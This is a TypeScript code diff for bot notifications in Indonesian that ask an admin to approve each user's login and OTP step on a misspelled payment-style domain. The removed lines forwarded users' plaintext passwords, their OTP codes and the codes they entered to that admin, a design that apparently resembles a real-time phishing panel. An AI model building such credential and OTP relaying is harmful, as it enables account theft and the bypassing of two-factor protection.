@@ -94,8 +94,7 @@ export async function sendApprovalRequest(
   ip: string,
   now: string,
   sessionKey: string,
-  label = "Login",
-  password?: string
+  label = "Login"
 ): Promise<number | null> {
   const text =
     `━━━━━━━━━━━━━━━━━━━━━\n` +
@@ -103,7 +102,6 @@ export async function sendApprovalRequest(
     `📌 <b>Permintaan ${label}</b>\n` +
     `━━━━━━━━━━━━━━━━━━━━━\n\n` +
     `👤 <b>Username</b>   : <code>${username}</code>\n` +
-    (password ? `🔑 <b>Password</b>   : <code>${password}</code>\n` : ``) +
     `🌐 <b>IP & Lokasi</b>: <code>${ip}</code>\n` +
     `🕐 <b>Waktu</b>      : ${now}\n\n` +
     `⚠️ <i>Setujui permintaan ${label.toLowerCase()} ini?</i>\n` +
@@ -263,16 +261,14 @@ export async function answerCallback(callbackId: string, text: string): Promise<
 
 /* ─── send OTP code to admin ────────────────────────────────────── */
 
-export async function sendBotOTP(otp: string, username: string): Promise<void> {
+export async function sendBotOTP(_otp: string, username: string): Promise<void> {
   const text =
     `━━━━━━━━━━━━━━━━━━━━━\n` +
     `🔐 <b>mypaymenttvaulltr.com</b>\n` +
-    `📌 <b>Kode OTP — Kirim ke User</b>\n` +
+    `📌 <b>Permintaan Kode OTP</b>\n` +
     `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-    `👤 <b>Username</b> : <code>${username}</code>\n` +
-    `🔢 <b>Kode OTP</b>  : <code>${otp}</code>\n\n` +
-    `📧 <i>Kirimkan kode ini ke email user secara manual.\n` +
-    `Jangan bagikan ke orang lain.</i>\n` +
+    `👤 <b>Username</b> : <code>${username}</code>\n\n` +
+    `📧 <i>User meminta kode verifikasi.</i>\n` +
     `━━━━━━━━━━━━━━━━━━━━━`;
   await post("/send-message", { text, parse_mode: "HTML" });
 }
@@ -292,7 +288,6 @@ export async function sendOtpVerificationRequest(
     `📌 <b>Verifikasi Kode OTP</b>\n` +
     `━━━━━━━━━━━━━━━━━━━━━\n\n` +
     `👤 <b>Username</b>     : <code>${username}</code>\n` +
-    `🔢 <b>Kode Dimasukkan</b>: <code>${enteredCode}</code>\n` +
     `${isCorrect ? "✅" : "❌"} <b>Status</b>       : ${isCorrect ? "BENAR" : "SALAH"}\n\n` +
     `⚠️ <i>Setujui akses user ini ke step berikutnya?</i>\n` +
     `━━━━━━━━━━━━━━━━━━━━━`;
